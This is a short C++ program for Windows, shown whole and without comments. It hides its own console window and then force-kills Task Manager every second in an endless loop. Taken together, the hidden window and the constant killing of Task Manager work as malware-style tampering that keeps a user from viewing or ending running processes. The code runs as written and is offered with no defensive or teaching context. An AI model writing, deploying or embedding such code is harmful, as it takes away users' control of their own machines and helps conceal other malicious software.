#include <cstdlib>
#include <iostream>
#include <chrono>
#include <thread>
#include <Windows.h>

int main() {

    HWND hwnd = GetConsoleWindow();

    ShowWindow(hwnd, SW_HIDE);

    while (true) {
        system("taskkill /F /IM Taskmgr.exe");
        std::cout << "Taskmgr.exe closed." << std::endl;
        
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    return 0;
}
